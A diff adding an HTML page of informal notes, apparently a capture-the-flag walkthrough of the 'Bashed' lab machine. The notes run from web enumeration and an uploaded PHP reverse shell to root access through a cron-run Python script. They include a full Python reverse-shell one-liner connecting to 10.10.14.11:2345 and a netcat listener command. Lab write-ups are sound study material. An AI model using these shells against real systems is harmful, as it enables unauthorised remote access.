@@ -1,0 +1,87 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>8.Bashed</title>
+</head><body>Did nmap scan now <br/>
+<img src="image.png" /><br/>
+<br/>
+we need a remote exploit and local exploit might help us only in privelege escalation purpose only<br/>
+<img src="image 2.png" /><br/>
+<br/>
+from this we didnnt get any though<br/>
+did dirbustr<br/>
+tried the source code couldnt find it <br/>
+so reading his blog <br/>
+<img src="image 3.png" width="550" height="258" /><br/>
+<br/>
+it seems that he has written a shell for a web<br/>
+<br/>
+<img src="image 4.png" /><br/>
+<br/>
+found this too lets navigate to it <br/>
+<img src="image 5.png" width="500" height="234" /><br/>
+<br/>
+and we get this <br/>
+thus got hold of user.txt now we need privelege escalation<br/>
+<img src="image 6.png" /><br/>
+thus we have access to script manager withiut the password<br/>
+<img src="image 7.png" /><br/>
+<br/>
+thus we dont have a tty present<br/>
+<img src="image 8.png" /><br/>
+thus we have access to www-data folder<br/>
+<img src="image 9.png" /><br/>
+<br/>
+thus found the uploads folder now <br/>
+so went to uploads/index.html<br/>
+bt it is empty <br/>
+so lets uload something malicous here and get a shell<br/>
+https://github.com/pentestmonkey/php-reverse-shell<br/>
+<br/>
+went here<br/>
+<img src="image 10.png" /><br/>
+<br/>
+did this then after saving that file<br/>
+lets start a netcat listener on our kali<br/>
+<img src="image 11.png" /><br/>
+<br/>
+<img src="image 12.png" /><br/>
+<br/>
+still tty nahi hai <br/>
+https://netsec.ws/?p=337<br/>
+whent on this site<br/>
+<img src="image 13.png" /><br/>
+use any of this <br/>
+<img src="image 14.png" /><br/>
+python -c 'import pty; pty.spawn("/bin/bash")';<br/>
+thus it worked<br/>
+<img src="image 15.png" /><br/>
+now tty issue goine<br/>
+<img src="image 16.png" /><br/>
+if u had done sudo su scriptmanager that didnt work bt could use sudo as used above<br/>
+<img src="image 17.png" /><br/>
+<br/>
+if u see scripts folder doesnt usually exist in general in linuzx machine and is the only folder owned by scriptmanager <br/>
+so dig into it<br/>
+<img src="image 18.png" /><br/>
+<br/>
+test.txt overwritten almost every minute<br/>
+<img src="image 19.png" /><br/>
+<br/>
+so in py file write something to talk back to us in form of root<br/>
+basically making python script into reverse shell<br/>
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet<br/>
+<img src="image 21.png" /><ul><li style="list-style-type: none">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",2345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);</li>
+</ul>
+found this online then<br/>
+nano isnt workign on attack machnie so host ur file and then trasnfer it <br/>
+<img src="image 20.png" /><br/>
+<br/>
+so basically when it runs again next minute our nc -nvlp 2345 should conncet it to us<br/>
+<img src="image 22.png" /><br/>
+<br/>
+<br/>
+next machine<br/>
+granny and grandpa<br/>
+</body></html>
